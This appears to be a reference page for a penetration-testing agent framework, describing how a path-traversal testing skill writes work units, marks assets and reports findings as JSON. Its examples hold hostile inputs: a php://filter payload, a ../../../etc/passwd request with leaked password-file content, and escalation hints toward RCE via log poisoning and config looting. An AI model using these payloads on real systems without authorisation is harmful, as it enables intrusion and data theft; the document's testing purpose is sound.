# rupu Wiring — path-traversal-testing

Every parse/handoff step ends in one of: a work-units JSON array file,
`assets.mark` calls, or a `findings.report` call.

## 1. Work units

Two fan-out points:

**(a) Candidate params** (Phase 1): write one unit per url+param so a
workflow `for_each:` / lead-agent `dispatch` can probe them in parallel.
**(b) Confirmed hits** (Phase 4): `scripts/parse_lfi.py --work-units
lfi_units.json` emits one unit per confirmed vector for escalation
(LFI→RCE, config looting).

Both are clean JSON **arrays** (first char `[`) so rupu `for_each:` can
JSON-parse the file read via `read_file`. Normalize/split with the shared
`work-units` skill.

```json
[
  {
    "id": "lfi-192-0-2-10-view-file-1",
    "title": "Escalate LFI on http://192.0.2.10/view param file",
    "targets": ["http://192.0.2.10/view?file=PWN"],
    "hints": {
      "param": "file",
      "payload": "php://filter/convert.base64-encode/resource=index.php",
      "technique": "php-filter",
      "file_read": "index.php",
      "rce": "false",
      "next": "filter-chain RCE, log poisoning, session include; loot configs",
      "wstg": "WSTG-INPV-11",
      "cwe": "CWE-22"
    }
  }
]
```

## 2. Assets (`assets.mark`)

Depth ladder `mapped -> crawled -> tested -> exploited` — mark the rung
actually reached.

Candidate param found by crawling:

```json
{
  "kind": "web:route",
  "label": "/view?file= (file-inclusion candidate)",
  "coordinates": [
    {"t": "url", "v": "http://192.0.2.10"},
    {"t": "http_route", "v": "/view"},
    {"t": "param", "v": "file"}
  ],
  "depth": "crawled"
}
```

- Route swept with dotdotpwn/lfimap/ffuf → re-mark `depth: "tested"`.
- Confirmed read or RCE → `depth: "exploited"`.
- The parent site:
  `{"kind":"web:site","label":"http://192.0.2.10","coordinates":[{"t":"url","v":"http://192.0.2.10"}],"depth":"mapped"}`.

## 3. Findings (`findings.report`)

`scripts/parse_lfi.py --findings lfi_findings.json` emits one payload per
hit; attach the real HTTP exchange, then submit each via the shared
`finding-report` skill. Web-profile completeness: route/url pinned
(`target_ref`), HTTP exchange in evidence, OWASP/CWE classification — all
three required.

```json
{
  "title": "Path traversal in file= reads /etc/passwd",
  "scope": "endpoint",
  "target_ref": "http://192.0.2.10/view?file=../../../etc/passwd",
  "severity": "high",
  "classification": {"wstg": "WSTG-INPV-11", "cwe": "CWE-22"},
  "evidence": {
    "rationale": "The file parameter of /view is concatenated into a filesystem path without canonicalization; ../../../etc/passwd returned the system password file (root:x:0:0: present), proving arbitrary file read outside the web root (CWE-22 / WSTG-INPV-11).",
    "http_exchanges": [
      {
        "name": "traversal read",
        "request": "GET /view?file=../../../etc/passwd HTTP/1.1\nHost: 192.0.2.10\n...",
        "response": "HTTP/1.1 200 OK\n...\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."
      }
    ],
    "leaked_content": "root:x:0:0:root:/root:/bin/bash\n..."
  }
}
```

Severity mapping (what parse_lfi.py applies):

| Result | severity | classification |
|---|---|---|
| file read outside web root | high | WSTG-INPV-11 + CWE-22 |
| LFI with RCE chain confirmed | critical | WSTG-INPV-11 + CWE-98 |
| RFI executing remote code | critical | WSTG-INPV-12 + CWE-98 |
| escape limited to web root | medium | WSTG-ATHZ-01 + CWE-22 |

Use scope `endpoint` with `target_ref` = the affected URL; scope `host` only
for host-wide issues (e.g. an nginx alias traversal affecting every vhost).
